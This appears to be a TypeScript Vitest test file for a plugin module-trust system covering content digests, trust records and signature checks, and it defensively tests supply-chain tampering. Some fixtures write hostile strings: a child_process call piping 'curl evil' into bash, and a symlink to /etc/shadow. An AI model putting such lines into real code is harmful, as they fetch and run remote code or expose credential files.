import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { mkdtempSync, mkdirSync, rmSync, writeFileSync, symlinkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

// PATHS is resolved at import time, so point configDir at a scratch directory
// before importing the module under test.
const configDir = mkdtempSync(join(tmpdir(), 'tc-trust-config-'));

vi.mock('../paths.js', () => ({
  PATHS: { configDir },
}));

const {
  computeModuleDigest,
  trustModule,
  untrustModule,
  listTrustedModules,
  verifyModuleTrust,
  verifyModuleSignature,
} = await import('../module-trust.js');

let moduleDir: string;

function writeModule(files: Record<string, string>): string {
  const dir = mkdtempSync(join(tmpdir(), 'tc-module-'));
  for (const [name, content] of Object.entries(files)) {
    const full = join(dir, name);
    mkdirSync(join(full, '..'), { recursive: true });
    writeFileSync(full, content);
  }
  return dir;
}

beforeEach(() => {
  moduleDir = writeModule({
    'mod.toml': '[module]\nname = "demo"\nversion = "1.0.0"\n',
    'index.js': 'export default class {}\n',
  });
});

afterEach(() => {
  rmSync(moduleDir, { recursive: true, force: true });
  for (const name of Object.keys(listTrustedModules())) untrustModule(name);
});

describe('computeModuleDigest', () => {
  it('is stable across repeated runs', () => {
    expect(computeModuleDigest(moduleDir)).toBe(computeModuleDigest(moduleDir));
  });

  it('changes when file contents change', () => {
    const before = computeModuleDigest(moduleDir);
    writeFileSync(join(moduleDir, 'index.js'), 'export default class { pwned() {} }\n');
    expect(computeModuleDigest(moduleDir)).not.toBe(before);
  });

  it('changes when a file is added', () => {
    const before = computeModuleDigest(moduleDir);
    writeFileSync(join(moduleDir, 'payload.js'), 'require("child_process").exec("curl evil");\n');
    expect(computeModuleDigest(moduleDir)).not.toBe(before);
  });

  it('covers files nested in node_modules', () => {
    mkdirSync(join(moduleDir, 'node_modules', 'dep'), { recursive: true });
    writeFileSync(join(moduleDir, 'node_modules', 'dep', 'index.js'), 'clean\n');
    const before = computeModuleDigest(moduleDir);

    // Swapping a transitive dependency must not slip past the digest.
    writeFileSync(join(moduleDir, 'node_modules', 'dep', 'index.js'), 'malicious\n');
    expect(computeModuleDigest(moduleDir)).not.toBe(before);
  });

  it('hashes a symlink by its target, without following it', () => {
    const secret = join(moduleDir, 'secret.txt');
    writeFileSync(secret, 'sensitive\n');
    const before = computeModuleDigest(moduleDir);

    symlinkSync('/etc/shadow', join(moduleDir, 'link'));
    expect(computeModuleDigest(moduleDir)).not.toBe(before);
  });
});

describe('verifyModuleTrust', () => {
  it('refuses a module that was never trusted', () => {
    const verdict = verifyModuleTrust('demo', moduleDir);
    expect(verdict.ok).toBe(false);
    expect(verdict.reason).toContain('not trusted');
  });

  it('allows a module after it is trusted', () => {
    trustModule('demo', moduleDir, moduleDir);
    expect(verifyModuleTrust('demo', moduleDir)).toEqual({ ok: true });
  });

  // The core supply-chain case: trusted once, then tampered with on disk.
  it('refuses a trusted module whose contents changed', () => {
    trustModule('demo', moduleDir, moduleDir);
    writeFileSync(join(moduleDir, 'index.js'), 'require("child_process").exec("curl evil | bash");\n');

    const verdict = verifyModuleTrust('demo', moduleDir);
    expect(verdict.ok).toBe(false);
    expect(verdict.reason).toContain('contents changed');
  });

  it('refuses again after trust is revoked', () => {
    trustModule('demo', moduleDir, moduleDir);
    untrustModule('demo');
    expect(verifyModuleTrust('demo', moduleDir).ok).toBe(false);
  });

  it('does not trust a different module that shares a digest', () => {
    trustModule('demo', moduleDir, moduleDir);
    expect(verifyModuleTrust('other-name', moduleDir).ok).toBe(false);
  });
});

describe('verifyModuleSignature', () => {
  it('is a no-op when no publisher keys are pinned', () => {
    expect(verifyModuleSignature(moduleDir, 'abc123')).toEqual({ ok: true });
  });

  it('rejects an unsigned module once keys are pinned', () => {
    writeFileSync(
      join(configDir, 'publisher-keys.json'),
      JSON.stringify({ 'key-1': '-----BEGIN PUBLIC KEY-----\nnot-a-real-key\n-----END PUBLIC KEY-----' }),
    );
    try {
      const verdict = verifyModuleSignature(moduleDir, 'abc123');
      expect(verdict.ok).toBe(false);
      expect(verdict.reason).toContain('no mod.sig');
    } finally {
      rmSync(join(configDir, 'publisher-keys.json'), { force: true });
    }
  });
});
